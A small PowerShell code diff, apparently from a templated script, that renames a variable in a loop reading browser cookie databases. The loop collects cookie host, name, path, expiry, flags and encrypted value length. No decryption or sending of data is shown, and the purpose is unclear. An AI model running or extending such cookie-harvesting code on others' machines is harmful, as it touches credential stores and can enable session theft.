@@ -78,14 +78,14 @@ public class SQLite {{
     if ($rc -ne 0) {{ [SQLite]::sqlite3_close($db); Remove-Item $tmp -Force -ErrorAction SilentlyContinue; continue }}
 
     while ([SQLite]::sqlite3_step($stmt) -eq 100) {{
-        $host = [Runtime.InteropServices.Marshal]::PtrToStringAnsi([SQLite]::sqlite3_column_text($stmt, 0))
+        $hostKey = [Runtime.InteropServices.Marshal]::PtrToStringAnsi([SQLite]::sqlite3_column_text($stmt, 0))
         $name = [Runtime.InteropServices.Marshal]::PtrToStringAnsi([SQLite]::sqlite3_column_text($stmt, 1))
         $path = [Runtime.InteropServices.Marshal]::PtrToStringAnsi([SQLite]::sqlite3_column_text($stmt, 2))
         $expires = [SQLite]::sqlite3_column_int64($stmt, 3)
         $secure = [SQLite]::sqlite3_column_int($stmt, 4)
         $httponly = [SQLite]::sqlite3_column_int($stmt, 5)
         $encLen = [SQLite]::sqlite3_column_int($stmt, 6)
-        $allResults += @{{ browser=$bname; host=$host; name=$name; path=$path; expires_utc=$expires; secure=$secure; httponly=$httponly; encrypted_value_length=$encLen }}
+        $allResults += @{{ browser=$bname; host_key=$hostKey; name=$name; path=$path; expires_utc=$expires; secure=$secure; httponly=$httponly; encrypted_value_length=$encLen }}
     }}
 
     [SQLite]::sqlite3_finalize($stmt)
